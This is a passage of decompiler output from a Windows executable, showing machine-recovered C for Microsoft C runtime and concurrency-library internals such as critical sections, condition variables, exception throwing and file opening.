    v9 = *(int (__thiscall **)(_DWORD *))(*this + 52);
    if ( a2 == -1 )
    {
      return v9(this);
    }
    else
    {
      v9(this);
      return (*(int (__thiscall **)(_DWORD *, int))(*this + 12))(this, a2);
    }
  }
  else if ( v4 && v5 > 0 )
  {
    *v3 = v5 - 1;
    v6 = (_DWORD *)this[8];
    v7 = (_BYTE *)(*v6)++;
    *v7 = a2;
    return (unsigned __int8)a2;
  }
  else
  {
    return (*(int (__thiscall **)(_DWORD *, _DWORD))(*this + 12))(this, (unsigned __int8)a2);
  }
}

//----- (00468D90) --------------------------------------------------------
int __thiscall sub_468D90(_DWORD **this)
{
  _BYTE *v2; // ebx
  _BYTE *v3; // esi
  FILE *v4; // eax
  _DWORD *v5; // ecx
  int v6; // esi
  int v7; // edx

  v2 = (_BYTE *)*this[4];
  v3 = (_BYTE *)*this[8];
  if ( v2 != v3 )
  {
    v4 = __acrt_iob_func(2u);
    fwrite(v2, 1u, v3 - v2, v4);
    v5 = this[8];
    v6 = *this[4];
    v7 = *v5 + *this[12];
    *v5 = v6;
    *this[12] = v7 - v6;
  }
  return 0;
}

//----- (00468EC3) --------------------------------------------------------
_DWORD *__cdecl sub_468EC3(_DWORD *a1)
{
  if ( dword_4F0508 < 0 )
    goto LABEL_4;
  if ( dword_4F0508 <= 1 )
  {
    if ( __security_cookie != dword_4F072C )
    {
      *a1 = &Concurrency::details::stl_condition_variable_win7::`vftable';
      unknown_libname_19(a1 + 1);
      return a1;
    }
  }
  else if ( dword_4F0508 != 2 )
  {
LABEL_4:
    *a1 = &Concurrency::details::stl_condition_variable_concrt::`vftable';
    return sub_46DC47(a1 + 1);
  }
  if ( __security_cookie == dword_4F0714 )
    goto LABEL_4;
  *a1 = &Concurrency::details::stl_condition_variable_vista::`vftable';
  unknown_libname_19(a1 + 1);
  return a1;
}
// 46BC26: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD);
// 4BD358: using guessed type void *Concurrency::details::stl_condition_variable_vista::`vftable';
// 4BD370: using guessed type void *Concurrency::details::stl_condition_variable_win7::`vftable';
// 4BD388: using guessed type void *Concurrency::details::stl_condition_variable_concrt::`vftable';
// 4F0508: using guessed type int dword_4F0508;
// 4F0714: using guessed type int dword_4F0714;
// 4F072C: using guessed type int dword_4F072C;

//----- (00468F15) --------------------------------------------------------
void __thiscall sub_468F15(_DWORD *this)
{
  sub_46DCB3(this + 1);
}

//----- (00468FE5) --------------------------------------------------------
void __thiscall sub_468FE5(_DWORD *this)
{
  sub_46E584(this + 1);
}

//----- (00468FED) --------------------------------------------------------
int __thiscall sub_468FED(char *this)
{
  return unknown_libname_25(this + 4);
}
// 46BDA6: using guessed type _DWORD __cdecl unknown_libname_25(_DWORD);

//----- (00468FF8) --------------------------------------------------------
void __thiscall sub_468FF8(_DWORD *this)
{
  sub_46E5EF(this + 1);
}

//----- (00469000) --------------------------------------------------------
int __thiscall sub_469000(char *this)
{
  return unknown_libname_26(this + 4);
}
// 46BDC6: using guessed type _DWORD __cdecl unknown_libname_26(_DWORD);

//----- (0046915E) --------------------------------------------------------
int __cdecl sub_46915E(int a1, struct _Mtx_internal_imp_t *a2)
{
  return unknown_libname_7(a1, a2, 0);
}
// 468F1D: using guessed type _DWORD __cdecl unknown_libname_7(_DWORD, _Mtx_t, _DWORD);

//----- (004692FC) --------------------------------------------------------
FARPROC __stdcall sub_4692FC(volatile __int32 *a1, LPCWSTR lpModuleName, LPCSTR lpProcName, int (__stdcall *a4)())
{
  HMODULE ModuleHandleW; // eax
  FARPROC ProcAddress; // esi

  if ( *a1 )
    return (FARPROC)__ROR4__(*a1 ^ __security_cookie, __security_cookie & 0x1F);
  ModuleHandleW = GetModuleHandleW(lpModuleName);
  if ( !ModuleHandleW || (ProcAddress = GetProcAddress(ModuleHandleW, lpProcName)) == 0 )
    ProcAddress = a4;
  _InterlockedExchange(a1, unknown_libname_8(ProcAddress));
  return ProcAddress;
}
// 46934B: using guessed type _DWORD __cdecl unknown_libname_8(_DWORD);

//----- (00469B2D) --------------------------------------------------------
int sub_469B2D()
{
  return unknown_libname_27((LPCRITICAL_SECTION)&unk_4F0228);
}
// 46BE0B: using guessed type _DWORD __cdecl unknown_libname_27(LPCRITICAL_SECTION lpCriticalSection);

//----- (00469B39) --------------------------------------------------------
void sub_469B39()
{
  sub_46BE19((LPCRITICAL_SECTION)&unk_4F0228);
}

//----- (00469E47) --------------------------------------------------------
int sub_469E47()
{
  return dword_4F0364;
}
// 4F0364: using guessed type int dword_4F0364;

//----- (0046A070) --------------------------------------------------------
char *__thiscall sub_46A070(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 4BD52C: using guessed type void *std::invalid_argument::`vftable';

//----- (0046A08B) --------------------------------------------------------
char *__thiscall sub_46A08B(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 4BD52C: using guessed type void *std::invalid_argument::`vftable';

//----- (0046A0AA) --------------------------------------------------------
char *__thiscall sub_46A0AA(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 4BD538: using guessed type void *std::length_error::`vftable';

//----- (0046A0C5) --------------------------------------------------------
char *__thiscall sub_46A0C5(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 4BD538: using guessed type void *std::length_error::`vftable';

//----- (0046A0E4) --------------------------------------------------------
char *__thiscall sub_46A0E4(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 4BD520: using guessed type void *std::logic_error::`vftable';

//----- (0046A0FF) --------------------------------------------------------
char *__thiscall sub_46A0FF(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 4BD544: using guessed type void *std::out_of_range::`vftable';

//----- (0046A11A) --------------------------------------------------------
char *__thiscall sub_46A11A(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 4BD544: using guessed type void *std::out_of_range::`vftable';

//----- (0046A166) --------------------------------------------------------
void __noreturn sub_46A166()
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_45ABA0(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 46A166: using guessed type void __noreturn sub_46A166();

//----- (0046A183) --------------------------------------------------------
void __cdecl __noreturn sub_46A183(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_46A0C5(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (0046A1A3) --------------------------------------------------------
void __cdecl __noreturn sub_46A1A3(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_46A11A(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}

//----- (0046A42C) --------------------------------------------------------
FILE *__cdecl sub_46A42C(char *a1, int a2, int a3)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // esi
  FILE *v7; // eax
  FILE *v9; // eax
  FILE *v10; // esi

  v3 = a2;
  v4 = 1;
  if ( (a2 & 0x40) != 0 )
    v3 = a2 | 1;
  if ( (v3 & 8) != 0 )
    v3 |= 2u;
  v5 = v3 & 0xFFFFFF3B;
  v6 = 0;
  do
  {
    if ( v4 == v5 )
      break;
    v4 = dword_4BE160[v6++];
  }
  while ( v4 );
  if ( !dword_4BE15C[v6] )
    return 0;
  if ( (a2 & 0x80) != 0 && (v5 & 0xA) != 0 )
  {
    v7 = sub_46A57E(a1, 0, a3);
    if ( v7 )
    {
      fclose(v7);
      return 0;
    }
  }
  v9 = sub_46A57E(a1, v6, a3);
  v10 = v9;
  if ( !v9 )
    return 0;
  if ( (a2 & 4) != 0 && fseek(v9, 0, 2) )
  {
    fclose(v10);
    return 0;
  }
  return v10;
}
// 4BE15C: using guessed type int dword_4BE15C[];
// 4BE160: using guessed type int dword_4BE160[14];

//----- (0046A4CC) --------------------------------------------------------
FILE *__cdecl sub_46A4CC(wchar_t *a1, int a2, int a3)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // esi
  FILE *v7; // eax
  FILE *v9; // eax
  FILE *v10; // esi

  v3 = a2;
  v4 = 1;
  if ( (a2 & 0x40) != 0 )
    v3 = a2 | 1;
  if ( (v3 & 8) != 0 )
    v3 |= 2u;
  v5 = v3 & 0xFFFFFF3B;
  v6 = 0;
  do
  {
    if ( v4 == v5 )
      break;
    v4 = dword_4BE19C[v6++];
  }
  while ( v4 );
  if ( !dword_4BE198[v6] )
    return 0;
  if ( (a2 & 0x80) != 0 && (v5 & 0xA) != 0 )
  {
    v7 = sub_46A59B(a1, 0, a3);
    if ( v7 )
    {
      fclose(v7);
      return 0;
    }
  }
  v9 = sub_46A59B(a1, v6, a3);
  v10 = v9;
  if ( !v9 )
    return 0;
  if ( (a2 & 4) != 0 && fseek(v9, 0, 2) )
  {
    fclose(v10);
    return 0;
  }
  return v10;
}
// 4BE198: using guessed type int dword_4BE198[];
// 4BE19C: using guessed type int dword_4BE19C[14];

//----- (0046A56C) --------------------------------------------------------
FILE *__cdecl sub_46A56C(char *a1, int a2, int a3)
{
  return sub_46A42C(a1, a2, a3);
}

//----- (0046A575) --------------------------------------------------------
FILE *__cdecl sub_46A575(wchar_t *a1, int a2, int a3)
{
  return sub_46A4CC(a1, a2, a3);
}

//----- (0046A57E) --------------------------------------------------------
FILE *__cdecl sub_46A57E(char *FileName, int a2, int ShFlag)
{
  return _fsopen(FileName, (&Mode)[a2], ShFlag);
}

//----- (0046A59B) --------------------------------------------------------
FILE *__cdecl sub_46A59B(wchar_t *FileName, int a2, int ShFlag)
{
  return _wfsopen(FileName, (&off_4BE0D4)[a2], ShFlag);
}

//----- (0046A650) --------------------------------------------------------
_DWORD *__cdecl sub_46A650(int a1)
{
  if ( dword_4F0508 < 0 )
    goto LABEL_4;
  if ( dword_4F0508 <= 1 )
  {
    if ( __security_cookie != dword_4F072C )
    {
      *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_win7::`vftable';
      unknown_libname_20(a1 + 4);
      return (_DWORD *)a1;
    }
  }
  else if ( dword_4F0508 != 2 )
  {
LABEL_4:
    *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_concrt::`vftable';
    return sub_46ED65((_DWORD *)(a1 + 4));
  }
  if ( __security_cookie == dword_4F0714 )
    goto LABEL_4;
  *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_vista::`vftable';
  __crtInitializeCriticalSectionEx((LPCRITICAL_SECTION)(a1 + 4), 0xFA0u, 0);
  return (_DWORD *)a1;
}
// 46BC46: using guessed type _DWORD __cdecl __crtInitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, _DWORD);
// 46BC7F: using guessed type _DWORD __cdecl unknown_libname_20(_DWORD);
// 4BE1F4: using guessed type void *Concurrency::details::stl_critical_section_vista::`vftable';
// 4BE20C: using guessed type void *Concurrency::details::stl_critical_section_win7::`vftable';
// 4BE224: using guessed type void *Concurrency::details::stl_critical_section_concrt::`vftable';
// 4F0508: using guessed type int dword_4F0508;
// 4F0714: using guessed type int dword_4F0714;
// 4F072C: using guessed type int dword_4F072C;

//----- (0046A6A2) --------------------------------------------------------
void sub_46A6A2()
{
  ;
}
// 406DC0: using guessed type _DWORD _guard_check_icall_nop();

//----- (0046A6AA) --------------------------------------------------------
void __thiscall sub_46A6AA(int this)
{
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0046A6B5) --------------------------------------------------------
signed __int32 __thiscall sub_46A6B5(int this)
{
  return sub_46F253((void *)(this + 4));
}

//----- (0046A6C8) --------------------------------------------------------
int __thiscall sub_46A6C8(char *this)
{
  return unknown_libname_13(this + 4);
}
// 46B990: using guessed type _DWORD __cdecl unknown_libname_13(_DWORD);

//----- (0046A85D) --------------------------------------------------------
char __thiscall sub_46A85D(void *this)
{
  return sub_46F281((signed __int32)this + 4);
}

//----- (0046A8B5) --------------------------------------------------------
void __thiscall sub_46A8B5(int this)
{
  sub_46F32A((void *)(this + 4));
}

//----- (0046A8BD) --------------------------------------------------------
void __thiscall sub_46A8BD(int this)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0046A8C8) --------------------------------------------------------
int __thiscall sub_46A8C8(char *this)
{
  return unknown_libname_21(this + 4);
}
// 46BC9F: using guessed type _DWORD __cdecl unknown_libname_21(_DWORD);

//----- (0046BE19) --------------------------------------------------------
void __cdecl sub_46BE19(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0046C4C6) --------------------------------------------------------
void sub_46C4C6()
{
  InitializeSListHead(&stru_4F0838);
}

//----- (0046C87D) --------------------------------------------------------
void __cdecl sub_46C87D(void *Block)
{
  j_j___free_base(Block);
}

//----- (0046C88B) --------------------------------------------------------
_DWORD *__thiscall sub_46C88B(_DWORD *this, char a2)
{
  *this = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0758: using guessed type void *type_info::`vftable';

//----- (0046C9CD) --------------------------------------------------------
int sub_46C9CD()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 46DA50: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (0046C9D5) --------------------------------------------------------
int sub_46C9D5()
{
  int v0; // eax

  sub_46D879();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (0046D40D) --------------------------------------------------------
void __cdecl sub_46D40D(void *Block)
{
  j_j_j___free_base(Block);
}

//----- (0046D879) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_46D879()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (0046D8C6) --------------------------------------------------------
void sub_46D8C6()
{
  dword_4F0B8C = 0;
}
// 4F0B8C: using guessed type int dword_4F0B8C;

//----- (0046D8CE) --------------------------------------------------------
char *__thiscall sub_46D8CE(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 4C07F0: using guessed type void *std::bad_array_new_length::`vftable';

//----- (0046D8E9) --------------------------------------------------------
_DWORD *__thiscall sub_46D8E9(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 4C07F0: using guessed type void *std::bad_array_new_length::`vftable';

//----- (0046D901) --------------------------------------------------------
void __noreturn sub_46D901()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_46D8E9(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 46D901: using guessed type void __noreturn sub_46D901();
// 46D901: using guessed type _DWORD pExceptionObject[3];

//----- (0046D97B) --------------------------------------------------------
int sub_46D97B()
{
  return 1;
}

//----- (0046DA4A) --------------------------------------------------------
void *sub_46DA4A()
{
  return &unk_4F0B90;
}

//----- (0046DA6D) --------------------------------------------------------
BOOL sub_46DA6D()
{
  return dword_4E8180 == 0;
}
// 4E8180: using guessed type int dword_4E8180;

//----- (0046DA79) --------------------------------------------------------
void *sub_46DA79()
{
  return &unk_4F15B8;
}

//----- (0046DA7F) --------------------------------------------------------
void *sub_46DA7F()
{
  return &unk_4F15B4;
}

//----- (0046DA85) --------------------------------------------------------
void sub_46DA85()
{
  ;
}
// 46DA85: could not find valid save-restore pair for edi

//----- (0046DAB1) --------------------------------------------------------
void __cdecl sub_46DAB1()
{
  ;
}
// 46DAB1: could not find valid save-restore pair for edi

//----- (0046DB0D) --------------------------------------------------------
int __thiscall sub_46DB0D(int this, int a2, char a3, unsigned __int8 a4)
{
  int result; // eax

  sub_46DC27((_DWORD *)this);
  *(_DWORD *)(this + 24) = a2 + a4;
  *(_DWORD *)this = &Concurrency::details::MultiWaitBlock::`vftable';
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 40) = a3;
  result = this;
  *(_DWORD *)(this + 36) = 0;
  *(_BYTE *)(this + 41) = 0;
  return result;
}
// 4C0844: using guessed type void *Concurrency::details::MultiWaitBlock::`vftable';

//----- (0046DB49) --------------------------------------------------------
_DWORD *__thiscall sub_46DB49(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5)
{
  _DWORD *v6; // ebx
  int v7; // ecx
  int v8; // edx
  int v10; // [esp-4h] [ebp-10h]

  this[5] = 0;
  v10 = 8 * a3 + 48;
  *this = 48;
  this[1] = 8;
  this[2] = v10;
  v6 = (_DWORD *)unknown_libname_28(v10);
  this[3] = v6;
  this[4] = v6;
  if ( a2 )
  {
    sub_46DB0D((int)v6, a3, a4, a5);
    *v6 = &Concurrency::details::WaitAllBlock::`vftable';
    v6[7] = a3;
  }
  else
  {
    sub_46DBFF(v6, a3, a4, a5);
  }
  v7 = *this + this[3];
  if ( a3 )
  {
    v8 = a3;
    do
    {
      *(_DWORD *)(v7 + 4) = this[4];
      v7 += this[1];
      --v8;
    }
    while ( v8 );
  }
  this[6] = a3 + 1 + a5;
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4C0860: using guessed type void *Concurrency::details::WaitAllBlock::`vftable';

//----- (0046DBD0) --------------------------------------------------------
int __thiscall sub_46DBD0(int this, char a2)
{
  int result; // eax

  sub_46DC27((_DWORD *)this);
  *(_DWORD *)this = &Concurrency::details::TimedSingleWaitBlock::`vftable';
  *(_DWORD *)(this + 16) = 0;
  *(_BYTE *)(this + 24) = a2;
  result = this;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 36) = 0;
  *(_DWORD *)(this + 16) = this;
  return result;
}
// 4C0898: using guessed type void *Concurrency::details::TimedSingleWaitBlock::`vftable';

//----- (0046DBFF) --------------------------------------------------------
_DWORD *__thiscall sub_46DBFF(_DWORD *this, int a2, char a3, unsigned __int8 a4)
{
  _DWORD *result; // eax

  sub_46DB0D((int)this, a2, a3, a4);
  *this = &Concurrency::details::WaitAnyBlock::`vftable';
  result = this;
  this[7] = 1;
  return result;
}
// 4C087C: using guessed type void *Concurrency::details::WaitAnyBlock::`vftable';

//----- (0046DC27) --------------------------------------------------------
_DWORD *__thiscall sub_46DC27(_DWORD *this)
{
  this[1] = 0;
  *this = &Concurrency::details::WaitBlock::`vftable';
  this[2] = 0;
  this[1] = sub_46FD4D();
  return this;
}
// 46FD4D: using guessed type int sub_46FD4D(void);
// 4C0814: using guessed type void *Concurrency::details::WaitBlock::`vftable';

//----- (0046DC47) --------------------------------------------------------
_DWORD *__thiscall sub_46DC47(_DWORD *this)
{
  *this = 0;
  sub_46ED65(this + 1);
  return this;
}

//----- (0046DC64) --------------------------------------------------------
_DWORD *__thiscall sub_46DC64(_DWORD *this)
{
  this[1] = 0;
  *this = 0;
  sub_46ED65(this + 2);
  return this;
}

//----- (0046DC95) --------------------------------------------------------
unsigned int __thiscall sub_46DC95(_DWORD *this)
{
  void *v2; // ecx
  unsigned int v3; // eax
  unsigned int result; // eax

  while ( 1 )
  {
    v3 = this[5];
    if ( v3 >= this[6] )
      break;
    v2 = (void *)this[4];
    ++this[5];
    sub_46DF84(v2);
  }
  result = v3 + 1;
  this[5] = result;
  return result;
}

//----- (0046DCB3) --------------------------------------------------------
void __thiscall sub_46DCB3(_DWORD *this)
{
  sub_46F164(this + 1);
  sub_46E584(this);
}
// 406DC0: using guessed type _DWORD _guard_check_icall_nop();

//----- (0046DCFF) --------------------------------------------------------
void __thiscall sub_46DCFF(_DWORD *this)
{
  _DWORD **v2; // esi
  _DWORD *v3; // ebx
  _DWORD **v4; // ecx
  _DWORD *v5; // esi

  sub_46F164(this + 2);
  v2 = (_DWORD **)*this;
  if ( *this > 1u )
  {
    do
    {
      v3 = *v2;
      if ( (unsigned __int8)sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, 0) )
        sub_46DDAD(v2);
      v2 = (_DWORD **)v3;
    }
    while ( v3 );
  }
  v4 = (_DWORD **)this[1];
  if ( v4 )
  {
    do
    {
      v5 = *v4;
      sub_46DDAD(v4);
      v4 = (_DWORD **)v5;
    }
    while ( v5 );
  }
}
// 406DC0: using guessed type _DWORD _guard_check_icall_nop();

//----- (0046DD81) --------------------------------------------------------
_DWORD *__thiscall sub_46DD81(_DWORD *this, char a2)
{
  int v4; // [esp-4h] [ebp-8h]

  v4 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  _freea_crt(v4);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 46C0C7: using guessed type _DWORD __cdecl _freea_crt(_DWORD);
// 4C08B0: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (0046DDAD) --------------------------------------------------------
int __thiscall sub_46DDAD(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 8))(this[1]);
}

//----- (0046DDC7) --------------------------------------------------------
void __thiscall sub_46DDC7(volatile signed __int32 *this)
{
  if ( _InterlockedIncrement(this + 7) == 2 )
    sub_46C87D((void *)this);
}

//----- (0046DDE5) --------------------------------------------------------
void __stdcall sub_46DDE5(int a1, int a2, int a3)
{
  char v3; // bl
  int v4; // [esp+8h] [ebp-4h]

  v3 = 0;
  if ( _InterlockedIncrement((volatile signed __int32 *)(a2 + 20)) == 1 )
  {
    v3 = 1;
    v4 = *(_DWORD *)(a2 + 4);
    *(_BYTE *)(a2 + 41) = 1;
    if ( v4 )
    {
      *(_DWORD *)(a2 + 12) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
  }
  sub_46DF84((void *)a2);
  if ( v3 )
    sub_46FC14(a1, a3);
}

//----- (0046DE43) --------------------------------------------------------
HMODULE __stdcall sub_46DE43(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3)
{
  HMODULE result; // eax

  result = (HMODULE)(**a2)(a2, 0, 0);
  if ( (_BYTE)result )
    return sub_46FC14(a1, a3);
  return result;
}

//----- (0046DE76) --------------------------------------------------------
void __stdcall sub_46DE76(int a1, int a2)
{
  int v2; // ebx
  void *v3; // eax
  void *v4; // [esp-Ch] [ebp-10h]

  if ( _InterlockedIncrement((volatile signed __int32 *)(a1 + 20)) == 1 )
  {
    v2 = *(_DWORD *)(a1 + 4);
    v4 = *(void **)(a1 + 16);
    v3 = (void *)sub_46DEF0();
    sub_46F594(v3, v4, 0);
    *(_BYTE *)(a1 + 41) = 1;
    if ( v2 )
    {
      *(_DWORD *)(a1 + 12) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    }
  }
  sub_46DF84((void *)a1);
}

//----- (0046DECE) --------------------------------------------------------
int __stdcall sub_46DECE(int (__thiscall ***a1)(_DWORD, _DWORD, _DWORD), int a2)
{
  return (**a1)(a1, 0, 0);
}

//----- (0046DEF0) --------------------------------------------------------
int sub_46DEF0()
{
  bool v0; // zf
  char v2[8]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+8h] [ebp-14h]
  int (*v4)(); // [esp+Ch] [ebp-10h]
  char pExceptionObject[12]; // [esp+10h] [ebp-Ch] BYREF

  if ( sub_471D09() >= 3 || dword_4F0B9C )
    return dword_4F0B9C;
  if ( _InterlockedCompareExchange(&dword_4F0B98, 1, 0) )
  {
    v3 = 0;
    v4 = sub_46FD09;
    while ( !dword_4F0B9C && dword_4F0B98 == 1 )
      sub_46E3D5((int)v2);
  }
  else
  {
    dword_4F0B9C = (int)CreateTimerQueue();
    v0 = dword_4F0B9C == 0;
    if ( dword_4F0B9C )
      goto LABEL_11;
    _InterlockedExchange(&dword_4F0B98, 0);
  }
  v0 = dword_4F0B9C == 0;
LABEL_11:
  if ( v0 )
  {
    sub_45ABA0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  return dword_4F0B9C;
}
// 471D09: using guessed type int sub_471D09(void);
// 4F0B98: using guessed type int dword_4F0B98;
// 4F0B9C: using guessed type int dword_4F0B9C;
// 46DEF0: using guessed type char var_1C[8];

//----- (0046DF84) --------------------------------------------------------
void __thiscall sub_46DF84(void *Block)
{
  int v1; // eax

  v1 = *((_DWORD *)Block + 6);
  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 9) == v1 + 1 )
    j_j_j___free_base(Block);
}

//----- (0046DF9D) --------------------------------------------------------
char __thiscall sub_46DF9D(volatile signed __int32 *this)
{
  int v1; // esi
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v1 = *((_DWORD *)this + 7);
  v2 = *((_DWORD *)this + 8);
  if ( v2 != v1 )
  {
    do
    {
      v3 = _InterlockedCompareExchange(this + 8, v2 - 1, v2);
      if ( v3 == v2 )
        break;
      v2 = v3;
    }
    while ( v3 != v1 );
    if ( v2 != v1 )
      return 1;
  }
  sub_46DF84((void *)this);
  return 0;
}

//----- (0046DFD6) --------------------------------------------------------
int __thiscall sub_46DFD6(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2)
{
  return (**this[1])(this[1], a2, this);
}

//----- (0046DFF8) --------------------------------------------------------
char __thiscall sub_46DFF8(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi

  if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
    || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
  {
    v3 = this[1];
    if ( a2 )
      *a2 = v3;
    else
      (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 12))(v3);
  }
  else if ( a2 )
  {
    *a2 = 0;
  }
  return 0;
}

//----- (0046E052) --------------------------------------------------------
char __thiscall sub_46E052(int this, _DWORD *a2, int a3)
{
  int v4; // edi

  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 32)) != 1 )
    return 0;
  sub_46E538(this, a3 != 0);
  *(_BYTE *)(this + 36) = a3 == 0;
  v4 = *(_DWORD *)(this + 4);
  if ( a2 )
    *a2 = v4;
  else
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
  return 1;
}

//----- (0046E0AB) --------------------------------------------------------
char __thiscall sub_46E0AB(volatile signed __int32 *this, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(this + 8) != *((_DWORD *)this + 7) )
    return 1;
  (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*this + 20))(this, a2, a3);
  sub_46DF84((void *)this);
  return 0;
}

//----- (0046E0F2) --------------------------------------------------------
char __thiscall sub_46E0F2(volatile signed __int32 *this, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(this + 8) == *((_DWORD *)this + 7) )
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*this + 20))(this, a2, a3);
  sub_46DF84((void *)this);
  return 0;
}

//----- (0046E135) --------------------------------------------------------
signed __int32 __thiscall sub_46E135(volatile signed __int32 *this)
{
  unsigned int v1; // edi
  signed __int32 result; // eax
  unsigned int v3; // ebx

  v1 = *this;
  for ( result = _InterlockedCompareExchange(this, 1, *this);
        result != v1;
        result = _InterlockedCompareExchange(this, 1, result) )
  {
    v1 = result;
  }
  if ( v1 > 1 )
  {
    do
    {
      v3 = *(_DWORD *)v1;
      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 4) + 12))(*(_DWORD *)(v1 + 4));
      v1 = v3;
    }
    while ( v3 );
  }
  return result;
}
// 46E15A: conditional instruction was optimized away because edi.4>=2u

//----- (0046E17D) --------------------------------------------------------
int __thiscall sub_46E17D(int this, _DWORD *a2, int a3)
{
  int v4; // ebx
  int result; // eax
  bool v6; // zf
  void *v7; // eax
  void *v8; // [esp-8h] [ebp-14h]

  v4 = *(_DWORD *)(this + 4);
  if ( !*(_BYTE *)(this + 40) || (result = _InterlockedIncrement((volatile signed __int32 *)(this + 20)), result == 1) )
  {
    v6 = *(_DWORD *)(this + 16) == 0;
    *(_DWORD *)(this + 12) = a3;
    if ( !v6 )
    {
      if ( sub_471D09() < 3 )
      {
        v8 = *(void **)(this + 16);
        v7 = (void *)sub_46DEF0();
        sub_46F594(v7, v8, (HANDLE)0xFFFFFFFF);
      }
      else
      {
        sub_46F9F0(*(_DWORD *)(this + 16));
      }
      if ( *(_DWORD *)(this + 20) == 1 )
        sub_46DF84((void *)this);
    }
    if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
      || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
    {
      result = (int)a2;
      if ( a2 )
        *a2 = v4;
      else
        return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
    else
    {
      result = (int)a2;
      if ( a2 )
        *a2 = 0;
    }
  }
  return result;
}
// 471D09: using guessed type int sub_471D09(void);

//----- (0046E22D) --------------------------------------------------------
_DWORD *__cdecl sub_46E22D(_DWORD **a1, char a2)
{
